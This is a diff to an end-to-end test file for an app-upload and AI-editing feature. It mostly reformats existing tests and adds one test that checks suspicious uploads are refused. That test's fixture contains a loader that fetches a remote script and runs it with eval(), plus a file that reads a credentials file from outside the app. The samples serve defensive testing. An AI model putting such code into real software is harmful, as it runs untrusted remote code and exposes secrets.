@@ -29,7 +29,8 @@ test("upload a TypeScript app as a zip, preview it and edit it with the AI", asy
       "  return <View style={{ flex: 1, justifyContent: 'center' }}><Greeting name=\"upload\" /></View>;",
       "}",
     ].join("\n"),
-    "hello-app/components/Greeting.tsx": "import { Text } from 'react-native';\ntype Props = { name: string };\nexport function Greeting({ name }: Props) { return <Text>Hello from {name}</Text>; }",
+    "hello-app/components/Greeting.tsx":
+      "import { Text } from 'react-native';\ntype Props = { name: string };\nexport function Greeting({ name }: Props) { return <Text>Hello from {name}</Text>; }",
     "hello-app/assets/splash.png": Buffer.from([0x89, 0x50, 0x4e, 0x47]),
     "hello-app/node_modules/react/index.js": "module.exports = {}",
   });
@@ -121,6 +122,25 @@ test("uploads that can't be used are explained", async ({ page }) => {
   await openUploadTab(page);
   await page.getByLabel("Upload a .zip or app files").setInputFiles({ name: "broken.zip", mimeType: "application/zip", buffer: Buffer.from("not a zip") });
   await expect(page.locator("#start").getByRole("alert")).toContainText("isn't a zip file");
-  await page.getByLabel("Upload a .zip or app files").setInputFiles({ name: "notes.zip", mimeType: "application/zip", buffer: await zipOf({ "notes.txt": "hi" }) });
+  await page
+    .getByLabel("Upload a .zip or app files")
+    .setInputFiles({ name: "notes.zip", mimeType: "application/zip", buffer: await zipOf({ "notes.txt": "hi" }) });
   await expect(page.locator("#start").getByRole("alert")).toContainText("No app source files found");
+});
+
+test("uploads with code that hides what it does are refused", async ({ page }) => {
+  await openUploadTab(page);
+  const zip = await zipOf({
+    "App.js": "import { run } from './lib/loader';\nexport default function App() { run(); return null; }",
+    "lib/loader.js": "export const run = () => fetch('https://example.com/payload.js').then((r) => r.text()).then((code) => eval(code));",
+    "lib/creds.js": "export const creds = require('../../../other-build/credentials.json');",
+  });
+  await page.getByLabel("Upload a .zip or app files").setInputFiles({ name: "sneaky.zip", mimeType: "application/zip", buffer: zip });
+  const summary = page.getByRole("region", { name: "Upload summary" });
+  const alert = summary.getByRole("alert");
+  await expect(alert).toContainText("This upload can't be used");
+  await expect(alert).toContainText("src/lib/loader.js");
+  await expect(alert).toContainText("eval()");
+  await expect(alert).toContainText("outside the app");
+  await expect(summary.getByRole("button", { name: /Open/ })).toHaveCount(0);
 });
